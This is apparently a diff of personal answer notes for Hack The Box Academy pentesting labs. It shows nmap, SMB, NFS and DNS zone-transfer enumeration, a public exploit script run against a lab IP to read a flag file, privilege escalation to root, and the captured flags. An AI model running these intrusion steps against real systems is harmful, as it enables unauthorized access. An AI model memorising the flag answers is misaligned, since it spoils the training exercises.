@@ -1,6 +1,9 @@
 
+## [Getting Started](https://academy.hackthebox.com/module/details/77)
 
-## [Service scanning](https://academy.hackthebox.com/module/77/section/726)
+### Pentesting Basics
+
+#### [Service scanning](https://academy.hackthebox.com/module/77/section/726)
 
 **Perform an Nmap scan of the target. What does Nmap display as the version of the service running on port 8080?**
 
@@ -37,7 +40,7 @@ cat flag.txt
 **Results**: dceece590f3284c3866305eb2473d099
 
 
-### [Web Enumeration](https://academy.hackthebox.com/module/77/section/728)
+#### [Web Enumeration](https://academy.hackthebox.com/module/77/section/728)
 
 **Try running some of the web enumeration techniques you learned in this section on the server above, and use the info you get to get the flag.**
 
@@ -60,9 +63,7 @@ Login into the app.
 **Results**: HTB{w3b_3num3r4710n_r3v34l5_53cr375}There are many retired boxes on the Hack The Box platform that are great for practicing Metasploit. Some of these include, but not limited to:
 
 
-### [Public Exploits](https://academy.hackthebox.com/module/77/section/843)
-
-
+#### [Public Exploits](https://academy.hackthebox.com/module/77/section/843)
 
 Access to the web app at http://ip:36883
 
@@ -97,7 +98,7 @@ python ./51937.py http://83.136.255.162:36883/ "/flag.txt" 4
 **Results**: HTB{my_f1r57_h4ck}
 
 
-### [Privilege Escalation](https://academy.hackthebox.com/module/77/section/844)
+#### [Privilege Escalation](https://academy.hackthebox.com/module/77/section/844)
 
 **SSH to $ip with user "user1" and password "password1". SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.**
 
@@ -184,8 +185,9 @@ cat /root/flag.txt
 **Results**:  HTB{pr1v1l363_35c4l4710n_2_r007}
 
 
+### Attacking your first box
 
-### Nibbles - Enumeration
+#### Nibbles - Enumeration
 
  **Run an nmap script scan on the target. What is the Apache version running on the server? (answer format: X.X.XX)**
 
@@ -197,7 +199,7 @@ sudo nmap -sC -sV $ip
 **Results**:  2.4.18
 
 
-### [# Nibbles - Initial Foothold](https://academy.hackthebox.com/module/77/section/852)
+#### [Nibbles - Initial Foothold](https://academy.hackthebox.com/module/77/section/852)
 
 **Gain a foothold on the target and submit the user.txt flag**
 
@@ -245,7 +247,7 @@ cat /home/nibbler/user.txt
 **Results**:  79c03865431abf47b90ef24b9695e14879c03865431abf47b90ef24b9695e148
 
 
-### [Nibbles - Privilege Escalation](https://academy.hackthebox.com/module/77/section/853)
+#### [Nibbles - Privilege Escalation](https://academy.hackthebox.com/module/77/section/853)
 
 Escalate privileges and submit the root.txt flag.
 
@@ -387,7 +389,7 @@ cat /root/root.txt
 
 
 
-## NETWORK ENUMERATION WITH NMAP
+## [Network Enumeration with Nmap](https://academy.hackthebox.com/module/details/19)
 
 ### Host Enumeration
 
@@ -518,11 +520,13 @@ Results: HTB{kjnsdf2n982n1827eh76238s98di1w6}
 
 
 
-## NETWORK ENUMERATION WITH NMAP
+## [Footprinting](https://academy.hackthebox.com/module/details/112)
 
-### FTP
+### Host Based Enumeration
 
-Which version of the FTP server is running on the target system? Submit the entire banner as the answer.
+#### FTP
+
+**Which version of the FTP server is running on the target system? Submit the entire banner as the answer.**
 
 ```
 nc -nv $ip 21
@@ -552,9 +556,9 @@ cat flag.
 Results: HTB{b7skjr4c76zhsds7fzhd4k3ujg7nhdjre}
 
 
-### SMB
+#### SMB
 
-What version of the SMB server is running on the target system? Submit the entire banner as the answer.
+**What version of the SMB server is running on the target system? Submit the entire banner as the answer.**
 
 ```
 sudo nmap $ip  -p445 -sV -A -sC
@@ -563,7 +567,7 @@ sudo nmap $ip  -p445 -sV -A -sC
 Results: Samba smbd 4.6.2
 
 
- What is the name of the accessible share on the target?
+ **What is the name of the accessible share on the target?**
 
 ```
  smbclient  -L //$ip 
@@ -572,7 +576,7 @@ Results: Samba smbd 4.6.2
 Results: sambashare
 
 
-Connect to the discovered share and find the flag.txt file. Submit the contents as the answer.
+**Connect to the discovered share and find the flag.txt file. Submit the contents as the answer.**
 
 ```
 smbclient  //$ip/sambashare -U ""
@@ -587,7 +591,7 @@ cat flag.txt
 Results: HTB{o873nz4xdo873n4zo873zn4fksuhldsf}
 
 
-Find out which domain the server belongs to.
+**Find out which domain the server belongs to.**
 
 ```
 rpcclient -U "" $ip
@@ -596,7 +600,7 @@ rpcclient $> querydominfo
 
 Results: DEVOPS
 
-Find additional information about the specific share we found previously and submit the customized version of that specific share as the answer.
+**Find additional information about the specific share we found previously and submit the customized version of that specific share as the answer.**
 
 ```
 rpcclient $> netsharegetinfo sambashare
@@ -606,7 +610,7 @@ Results: InFreight SMB v3.1
 
 
 
-What is the full system path of that specific share? (format: "/directory/names")
+**What is the full system path of that specific share? (format: "/directory/names")**
 
 ```
 rpcclient $> netsharegetinfo sambashare
@@ -615,10 +619,9 @@ rpcclient $> netsharegetinfo sambashare
 Results: /home/sambauser
 
 
-### NFS
+#### NFS
 
-
-Enumerate the NFS service and submit the contents of the flag.txt in the "nfs" share as the answer.
+**Enumerate the NFS service and submit the contents of the flag.txt in the "nfs" share as the answer.**
 
 ```
 sudo nmap $ip -p111,2049 -sV -sC
@@ -632,12 +635,187 @@ cat var/nfs/flag.txt
 
 Results: HTB{hjglmvtkjhlkfuhgi734zthrie7rjmdze}
 
-
-
-Enumerate the NFS service and submit the contents of the flag.txt in the "nfsshare" share as the answer.
+**Enumerate the NFS service and submit the contents of the flag.txt in the "nfsshare" share as the answer.**
 
 ```
 cat mnt/nfsshare/flag.txt 
 ```
 
 Results: HTB{8o7435zhtuih7fztdrzuhdhkfjcn7ghi4357ndcthzuc7rtfghu34}
+
+
+#### DNS
+
+**Interact with the target DNS using its IP address and enumerate the FQDN of it for the "inlanefreight.htb" domain.**
+
+
+```
+dig any inlanefreight.htb @$ip
+```
+
+Result: 
+ns.inlanefreight.htb
+
+
+
+**Identify if its possible to perform a zone transfer and submit the TXT record as the answer. (Format: HTB{...))**
+
+```
+#First, we do an initial transfer zone
+dig axfr inlanefreight.htb @$ip
+```
+
+Results:
+
+```
+
+; <<>> DiG 9.19.21-1-Debian <<>> axfr inlanefreight.htb @10.129.218.112
+;; global options: +cmd
+inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
+inlanefreight.htb.	604800	IN	TXT	"MS=ms97310371"
+inlanefreight.htb.	604800	IN	TXT	"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
+inlanefreight.htb.	604800	IN	TXT	"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
+inlanefreight.htb.	604800	IN	NS	ns.inlanefreight.htb.
+app.inlanefreight.htb.	604800	IN	A	10.129.18.15
+dev.inlanefreight.htb.	604800	IN	A	10.12.0.1
+internal.inlanefreight.htb. 604800 IN	A	10.129.1.6
+mail1.inlanefreight.htb. 604800	IN	A	10.129.18.201
+ns.inlanefreight.htb.	604800	IN	A	127.0.0.1
+inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
+;; Query time: 44 msec
+;; SERVER: 10.129.218.112#53(10.129.218.112) (TCP)
+;; WHEN: Wed Jul 31 13:57:45 EDT 2024
+;; XFR size: 11 records (messages 1, bytes 560)
+
+```
+
+
+ With the result, now we can do a second transfer zone
+
+```
+dig axfr internal.inlanefreight.htb @$ip
+```
+
+
+Results:
+
+```
+; <<>> DiG 9.19.21-1-Debian <<>> axfr internal.inlanefreight.htb @10.129.218.112
+;; global options: +cmd
+internal.inlanefreight.htb. 604800 IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
+internal.inlanefreight.htb. 604800 IN	TXT	"MS=ms97310371"
+internal.inlanefreight.htb. 604800 IN	TXT	"HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}"
+internal.inlanefreight.htb. 604800 IN	TXT	"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
+internal.inlanefreight.htb. 604800 IN	TXT	"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
+internal.inlanefreight.htb. 604800 IN	NS	ns.inlanefreight.htb.
+dc1.internal.inlanefreight.htb.	604800 IN A	10.129.34.16
+dc2.internal.inlanefreight.htb.	604800 IN A	10.129.34.11
+mail1.internal.inlanefreight.htb. 604800 IN A	10.129.18.200
+ns.internal.inlanefreight.htb. 604800 IN A	127.0.0.1
+vpn.internal.inlanefreight.htb.	604800 IN A	10.129.1.6
+ws1.internal.inlanefreight.htb.	604800 IN A	10.129.1.34
+ws2.internal.inlanefreight.htb.	604800 IN A	10.129.1.35
+wsus.internal.inlanefreight.htb. 604800	IN A	10.129.18.2
+internal.inlanefreight.htb. 604800 IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
+;; Query time: 44 msec
+;; SERVER: 10.129.218.112#53(10.129.218.112) (TCP)
+;; WHEN: Wed Jul 31 13:58:29 EDT 2024
+;; XFR size: 15 records (messages 1, bytes 677)
+```
+
+Then: HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}
+
+
+**What is the IPv4 address of the hostname DC1?**
+
+Get the answer from the response to the previous question. In this case: 10.129.34.16
+
+
+What is the FQDN of the host where the last octet ends with "x.x.x.203"?
+
+```
+dnsenum --dnsserver 10.129.218.112 --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt dev.inlanefreight.htb
+```
+
+Results:
+
+```
+-----   dev.inlanefreight.htb   -----
+
+
+Host's addresses:
+__________________
+
+
+
+Name Servers:
+______________
+
+ns.inlanefreight.htb.                    604800   IN    A         127.0.0.1
+
+
+Mail (MX) Servers:
+___________________
+
+
+
+Trying Zone Transfers and getting Bind Versions:
+_________________________________________________
+
+unresolvable name: ns.inlanefreight.htb at /usr/bin/dnsenum line 892 thread 2.
+
+Trying Zone Transfer for dev.inlanefreight.htb on ns.inlanefreight.htb ... 
+AXFR record query failed: no nameservers
+
+
+Brute forcing with /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt:
+__________________________________________________________________________
+
+dev1.dev.inlanefreight.htb.              604800   IN    A         10.12.3.6
+ns.dev.inlanefreight.htb.                604800   IN    A         127.0.0.1
+win2k.dev.inlanefreight.htb.             604800   IN    A        10.12.3.203
+
+```
+
+Therefore: win2k.dev.inlanefreight.htb
+
+#### SMTP
+
+#### IMAP / POP3
+
+#### SNMP
+
+#### MySQL
+
+#### MSSQL
+
+#### Oracle TNS
+
+#### IPMI
+
+
+### Skills assessment
+
+#### Footprinting Lab - Easy
+
+#### Footprinting Lab - Medium
+
+#### Footprinting Lab - Hard
+
+## [Information Gathering - Web Edition](https://academy.hackthebox.com/module/details/144)
+
+## [Vulnerability Assessment](https://academy.hackthebox.com/module/details/108)
+
+## [File Transfers](https://academy.hackthebox.com/module/details/24)
+
+## [Shells & Payloads](https://academy.hackthebox.com/module/details/115)
+
+## [Using the Metasploit Framework](https://academy.hackthebox.com/module/details/39)
+
+## [Password Attacks](https://academy.hackthebox.com/module/details/147)
+
+## [Attacking Common Services](https://academy.hackthebox.com/module/details/116)
+
+## [Pivoting, Tunneling, and Port Forwarding](https://academy.hackthebox.com/module/details/158)
+
+## [Active Directory Enumeration & Attacks](https://academy.hackthebox.com/module/details/143)
